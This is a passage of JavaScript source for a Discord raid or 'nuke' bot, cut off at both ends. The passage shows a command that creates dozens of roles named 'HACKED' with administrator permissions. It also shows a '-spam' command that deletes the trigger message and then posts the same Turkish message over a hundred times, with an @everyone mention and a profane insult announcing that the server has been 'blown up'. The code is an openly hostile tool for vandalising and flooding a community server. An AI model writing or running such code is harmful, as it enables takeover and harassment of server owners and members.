      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E12020",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "E000FF",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"],
    });
    msg.guild.createRole({
      name: "HACKED",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"],
    });
  }
});

client.on("message", (msg) => {
  if (msg.content === "-spam") {
    msg.delete();
    //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
      "**BU SUNUCU EGE TARAFINDAN PATLATILMIŞTIR AYAĞINIZI DENK ALIN OROSPU ÇOCUKLARI** @everyone"
    );
    msg.channel.send(
